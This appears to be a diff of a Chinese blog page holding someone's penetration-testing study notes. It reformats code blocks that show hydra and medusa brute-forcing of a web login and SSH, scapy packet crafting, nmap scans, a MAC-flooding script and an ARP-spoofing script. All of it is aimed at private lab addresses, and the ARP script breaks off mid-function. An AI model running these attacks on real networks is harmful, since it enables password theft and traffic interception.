@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    996
+                    1k
                 </div>
                 
 
@@ -527,7 +527,11 @@
 <li><code>https:</code> SHA,RSA,AES</li>
 <li>对称加密：AES,DES,RC5</li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span></span><br><span class="line">pip uninstall crypto </span><br><span class="line">pip uninstall pycryptodome</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>pip uninstall crypto </span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>pip uninstall pycryptodome</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>pip install pycryptodome</span></code></pre></div>
 <h3 id="爆破woniusales系统">爆破woniusales系统</h3>
 <ol type="1">
 <li>爆破md5</li>
@@ -547,14 +551,19 @@
 <li><code>hydra</code></li>
 </ol>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line"></span><br><span class="line">hydra -s 8080 -l admin -P ./password-3000.txt 192.168.112.130 -m <span class="string">&quot;/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail&quot;</span> http-form-post</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-h</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-s</span> 8080 <span class="at">-l</span> admin <span class="at">-P</span> ./password-3000.txt 192.168.112.130 <span class="at">-m</span> <span class="st">&quot;/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail&quot;</span> http-form-post</span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/08/k8tY97DIjx4wiRZ.png"
 alt="hydra" />
 <figcaption aria-hidden="true">hydra</figcaption>
 </figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P ./password-3000.txt -vV -o ssh.log -e ns 192.168.112.118 ssh</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.112.188 -u root -p ./password-3000.txt -t 200 -M ssh</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-l</span> root <span class="at">-P</span> ./password-3000.txt <span class="at">-vV</span> <span class="at">-o</span> ssh.log <span class="at">-e</span> ns 192.168.112.118 ssh</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">medusa</span> <span class="at">-h</span> 192.168.112.188 <span class="at">-u</span> root <span class="at">-p</span> ./password-3000.txt <span class="at">-t</span> 200 <span class="at">-M</span> ssh</span></code></pre></div>
 <blockquote>
 <ol start="2" type="1">
 <li><code>medusa</code></li>
@@ -579,7 +588,8 @@ alt="medusa" />
 <ol type="1">
 <li>使用<code>ping</code>, <code>import os</code></li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ......| findstr TTL</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>ping <span class="op">......|</span> findstr TTL</span></code></pre></div>
 <blockquote>
 <p>注意防火墙</p>
 </blockquote>
@@ -587,26 +597,38 @@ alt="medusa" />
 <ol type="1">
 <li>监听流量、分析流量、编辑流量数据包（链路层、网络层、传输层</li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_interfaces()</span><br><span class="line">pack=sniff(count=<span class="number">10</span>,iface=<span class="string">&#x27;VMware Virtual Ethernet Adapter for VMnet8&#x27;</span>)</span><br><span class="line">pack[<span class="number">0</span>].show()</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>show_interfaces<span class="op">()</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>pack<span class="op">=</span>sniff<span class="op">(</span>count<span class="op">=</span>10<span class="op">,</span>iface<span class="op">=</span><span class="st">&#39;VMware Virtual Ethernet Adapter for VMnet8&#39;</span><span class="op">)</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>pack<span class="op">[</span>0<span class="op">].</span><span class="fu">show</span><span class="op">()</span></span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/12/qHMoxSUEKaYcXRN.png"
 alt="image-20220809202221278" />
 <figcaption aria-hidden="true">image-20220809202221278</figcaption>
 </figure>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pack.summary()</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>pack<span class="op">.</span><span class="fu">summary</span><span class="op">()</span></span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/09/1LFsnJxogDHByfq.png"
 alt="image-20220809203824463" />
 <figcaption aria-hidden="true">image-20220809203824463</figcaption>
 </figure>
 <p>​</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP())</span><br></pre></td></tr></table></figure>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 带载荷</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHHHHHH&quot;</span>)</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a> send<span class="op">(</span>IP<span class="op">(</span>dst<span class="op">=</span><span class="st">&quot;192.168.104.129&quot;</span><span class="op">)/</span>ICMP<span class="op">())</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 带载荷</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>send<span class="op">(</span>IP<span class="op">(</span>dst<span class="op">=</span><span class="st">&quot;192.168.104.129&quot;</span><span class="op">)/</span>ICMP<span class="op">()/</span><span class="st">&quot;HHHHHHHHHHHHHH&quot;</span><span class="op">)</span></span></code></pre></div>
 <p>​</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHH&quot;</span>,inter=<span class="number">1</span>,count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg=sr1(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHJH&quot;</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP().show()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg = IP(dst=<span class="string">&#x27;192.168.104.129&#x27;</span>)/TCP(dport=<span class="number">22</span>)</span><br><span class="line">sr1(pkg)</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>send(IP(dst<span class="op">=</span><span class="st">&quot;192.168.104.129&quot;</span>)<span class="op">/</span>ICMP()<span class="op">/</span><span class="st">&quot;HHHHHHHH&quot;</span>,inter<span class="op">=</span><span class="dv">1</span>,count<span class="op">=</span><span class="dv">5</span>)</span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>pkg<span class="op">=</span>sr1(IP(dst<span class="op">=</span><span class="st">&quot;192.168.104.129&quot;</span>)<span class="op">/</span>ICMP()<span class="op">/</span><span class="st">&quot;HHHHHHHHHJH&quot;</span>)</span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>IP().show()</span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a> pkg <span class="op">=</span> IP(dst<span class="op">=</span><span class="st">&#39;192.168.104.129&#39;</span>)<span class="op">/</span>TCP(dport<span class="op">=</span><span class="dv">22</span>)</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a> sr1(pkg)</span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/12/78QAoSVuz1Ihv2E.png"
 alt="image-20220809224546860" />
@@ -639,7 +661,8 @@ alt="image-20220810160144705" />
 <figcaption aria-hidden="true">image-20220810160144705</figcaption>
 </figure>
 <h3 id="nmap">nmap</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 网段/地址范围</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sn</span> 网段/地址范围</span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/10/LKekJzNAhCGtsrB.png"
 alt="image-20220810164036582" />
@@ -724,7 +747,12 @@ aria-hidden="true">https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png</figcaptio
 alt="image-20220810203827981" />
 <figcaption aria-hidden="true">image-20220810203827981</figcaption>
 </figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pyton-whois 库</span></span><br><span class="line"><span class="keyword">from</span> whois <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whois_info</span>():</span><br><span class="line">    result = whois(<span class="string">&#x27;woniuxy.com&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># pyton-whois 库</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> whois <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> whois_info():</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> whois(<span class="st">&#39;woniuxy.com&#39;</span>)</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(result)</span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/10/LYZBXAivP91wjdb.png"
 alt="nslookup" />
@@ -753,14 +781,32 @@ target="_blank" rel="noopener" href="https://fofa.info/toLogin">click</a></p>
 <li>MAC地址泛洪</li>
 </ul>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:macof</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">kali:macof</span></span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> randmac</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.layers.l2 <span class="im">import</span> Ether</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.volatile <span class="im">import</span> RandMAC</span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> mac_flood():</span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>        randMac <span class="op">=</span> RandMAC(<span class="st">&quot;*:*:*:*&quot;</span>)</span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(randMac)</span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>        srandip <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">&#123;</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">&#125;</span><span class="ss">&quot;</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>        drandip <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">&#123;</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">&#125;</span><span class="ss">&quot;</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>        packet <span class="op">=</span> Ether(src<span class="op">=</span>randMac, dst<span class="op">=</span>randMac)<span class="op">/</span>IP(src<span class="op">=</span>srandip, dst<span class="op">=</span>drandip)</span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>        sendp(packet, iface<span class="op">=</span><span class="st">&quot;网卡名称&quot;</span>, loop<span class="op">=</span><span class="dv">0</span>)</span></code></pre></div>
 <ol start="2" type="1">
 <li><code>vmWare</code>中的混杂模式</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethernet0.noPromsic = &quot;TRUE&quot;    # 禁用</span><br></pre></td></tr></table></figure>
+<pre><code>ethernet0.noPromsic = &quot;TRUE&quot;    # 禁用</code></pre>
 <h3 id="arp攻击与欺骗">ARP攻击与欺骗</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root -n  <span class="comment"># 查看网关</span></span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root</span> <span class="at">-n</span>  <span class="co"># 查看网关</span></span></code></pre></div>
 <blockquote>
 <ul>
 <li>kali (.129)攻击 win10(.131)</li>
@@ -795,7 +841,53 @@ alt="image-20220811161453521" />
 <blockquote>
 <p><code>driftnet</code>: 从发过来的流量中捕获图像并显示</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.sendrecv <span class="keyword">import</span> sendp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether, ARP</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    iface = <span class="string">&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;</span></span><br><span class="line">    <span class="comment"># 被攻击主机</span></span><br><span class="line">    target_ip = <span class="string">&#x27;192.168.104.131&#x27;</span></span><br><span class="line">    target_mac = <span class="string">&#x27;00:0C:29:E0:9C:B3&#x27;</span>		<span class="comment"># 网卡用“:”</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被攻击主机的MAC和IP,kali</span></span><br><span class="line">    spoof_ip = <span class="string">&#x27;192.168.104.129&#x27;</span></span><br><span class="line">    spoof_mac = <span class="string">&#x27;00:0c:29:8e:52:c1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 真实网关的MAC和IP</span></span><br><span class="line">    gateway_ip = <span class="string">&#x27;192.168.104.2&#x27;</span></span><br><span class="line">    gateway_mac = <span class="string">&#x27;00:50:56:ea:a2:db&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet,iface=iface)</span><br><span class="line"></span><br><span class="line">        packet = Ether(src=spoof_mac, dst=gateway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet, iface=iface)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arp_spoof()</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.sendrecv <span class="im">import</span> sendp</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> randmac</span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.layers.l2 <span class="im">import</span> Ether, ARP</span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.volatile <span class="im">import</span> RandMAC</span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> mac_flood():</span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>     <span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>        randMac <span class="op">=</span> RandMAC(<span class="st">&quot;*:*:*:*&quot;</span>)</span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(randMac)</span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>        srandip <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">&#123;</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">&#125;</span><span class="ss">&quot;</span></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>        drandip <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">&#123;</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">.</span>random<span class="sc">.</span>randint(<span class="dv">1</span>, <span class="dv">254</span>)<span class="sc">&#125;</span><span class="ss">&quot;</span></span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>        packet <span class="op">=</span> Ether(src<span class="op">=</span>randMac, dst<span class="op">=</span>randMac)<span class="op">/</span>IP(src<span class="op">=</span>srandip, dst<span class="op">=</span>drandip)</span>
+<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a>        sendp(packet, iface<span class="op">=</span><span class="st">&quot;网卡名称&quot;</span>, loop<span class="op">=</span><span class="dv">0</span>)</span>
+<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> arp_spoof():</span>
+<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a>    iface <span class="op">=</span> <span class="st">&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;</span></span>
+<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 被攻击主机</span></span>
+<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a>    target_ip <span class="op">=</span> <span class="st">&#39;192.168.104.131&#39;</span></span>
+<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a>    target_mac <span class="op">=</span> <span class="st">&#39;00:0C:29:E0:9C:B3&#39;</span>        <span class="co"># 网卡用“:”</span></span>
